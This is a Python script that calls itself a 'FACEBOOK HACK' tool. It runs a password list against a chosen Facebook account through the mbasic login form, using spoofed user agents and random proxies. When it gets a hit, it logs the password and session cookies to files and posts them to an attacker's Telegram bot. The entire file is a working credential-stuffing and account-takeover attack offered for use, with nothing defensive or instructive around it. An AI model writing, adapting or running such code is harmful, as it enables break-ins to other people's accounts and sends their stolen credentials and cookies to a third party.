import requests
import time
from bs4 import BeautifulSoup
import random
import os
import threading

user_agent = []

for x in range(1000):
    rr = random.randint
    redmi = f"Mozilla/5.0 (Linux; Android {rr(9,10)}; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{rr(0,200)}.0.{rr(500,4000)}.{rr(0,200)} Mobile SFB/{rr(0,150)}.0.{rr(0,5000)}.{rr(0,200)} Mobile Safari/537.36"
    user_agent.append(redmi)

ua = random.choice(user_agent)
ok = 0
no = 0
error = 0
B = '\x1b[38;5;208m'
F = '\033[2;32m'
Z = '\033[1;31m'
C = '\033[2;35m'
M = '\x1b[1;37m'
X = '\033[1;33m'
A = '\033[2;34m'

print(f'''{B}{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━{B}
|{Z}[+] YouTube    : {B}| أحمد الحراني
|{Z}[+] TeleGram  : {B} maho_s9    |
|{Z}[+] Instagram  : {B}ahmedalharrani |
|{Z}[+] Tool  : {B} FACEBOOK HACK |
{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━━━━━━ ''')

token = input(B + f'Token BOT: {X}')
print('-' * 60)
ID = input(B + f'ID TELEGRAM : {C}')
print('-' * 60)
idf = input(f'{X}[+] ENTER ID OR EMAIL TO HACK HIM - الايدي او الايميل الذي تريد تخترقه : {M}')
print(f'{M}_' * 60)
file = input(f'{A}[+] ENTER Name of your Combo Password: {C} ')
def Facebook():
    global ok, no, error
    try:
        with open(file, "r") as f:
            for line in f:
                psw = line.strip()

                ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
                pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900]
                port = random.choice(pl)
                proxy = ip + ":" + str(port)

                with requests.Session() as session:
                    rr = session.get("https://mbasic.facebook.com/login")
                    soup = BeautifulSoup(rr.content, 'html.parser')
                    uid = soup.find('input', {'name': 'lsd'}).get('value')
                    giz = soup.find('input', {'name': 'jazoest'}).get('value')
                    tok = soup.find('input', {'name': 'li'}).get('value')
                    mmmkk = session.cookies.get_dict()
                    hh = str(mmmkk.get('datr', ''))
                    su = str(mmmkk.get('sb', ''))

                req = session.post('https://mbasic.facebook.com/login/device-based/regular/login/', params={'refsrc': 'deprecated', 'lwv': '100', 'ref': 'dbl'}, cookies={'datr': hh, 'sb': su, 'ps_l': '0', 'ps_n': '0'}, headers={'authority': 'mbasic.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded', 'dpr': '2', 'origin': 'https://mbasic.facebook.com', 'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"', 'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Linux"', 'sec-ch-ua-platform-version': '""', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': str(ua), 'viewport-width': '980'}, data={'lsd': str(uid), 'jazoest': str(giz), 'm_ts': str(time.time()).split('.')[0], 'li': str(tok), 'try_number': '0', 'unrecognized_tries': '0', 'email': str(idf), 'pass': str(psw), 'login': 'تسجيل الدخول', 'bi_xrwh': '0'}, proxies={'http': proxy})

                if "c_user" in session.cookies.get_dict():
                    cook = (";").join(["%s=%s" % (key, value) for key, value in session.cookies.get_dict().items()])
                    ok += 1
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'''
{F}[√]{F}HITS{F} : {X}{ok}{X}
{B}[+]{B}CP{B} : {C}{no}{C}
{Z}[*]{Z}ERORR{Z} : {M}{error}{M}
[√]ID{A} : {idf}{M} | Password{X} : {psw}{M}
[#] BY : @maho_s9
            ''')
                    tlg = (f'''
 Good Login
 -------------+------------+----------------    
 ID = {idf}
 -------------+------------+----------------    
 Password = {psw}
 -------------+------------+----------------    
 Cookies = {cook}
 -------------+------------+----------------    
 BY : @maho_s9 | @maho9s
            ''')
                    print(F+tlg)
                    requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=" + str(tlg))
                    with open('Facebook_OK.txt', 'a') as x:
                        x.write(idf + ":" + psw + '\n' + tlg)
                elif "checkpoint" in session.cookies.get_dict():
                    no += 1
                    cook = (";").join(["%s=%s" % (key, value) for key, value in session.cookies.get_dict().items()])
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'''
{F}[√]{F}HITS{F} : {X}{ok}{X}
{B}[+]{B}CP{B} : {C}{no}{C}
{Z}[*]{Z}ERORR{Z} : {M}{error}{M}
[√]ID{A} : {idf}{M} | Password{X} : {psw}{M}
[#] BY : @maho_s9
            ''')
                    tlg = (f'''
            حساب سيكور
-------------+------------+----------------    
ID = {idf}
-------------+------------+----------------    
Password = {psw}
-------------+------------+----------------    
Cookies = {cook}
-------------+------------+---------------- 
BY : @maho_9s | @maho9s
                ''')
                    print(B+tlg)
                    requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=" + str(tlg))
                    with open('Facebook_CP.txt', 'a') as x:
                        x.write(idf + ":" + psw + '\n' + tlg)
                else:
                    error += 1
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'''
{F}[√]{F}HITS{F} : {X}{ok}{X}
{B}[+]{B}CP{B} : {C}{no}{C}
{Z}[*]{Z}ERORR{Z} : {M}{error}{M}
[√]ID{A} : {idf}{M} | Password{X} : {psw}{M}
[#] BY : @maho_s9
            ''')
    except Exception as e:
        print(f"Error: {e}")
        
Facebook()
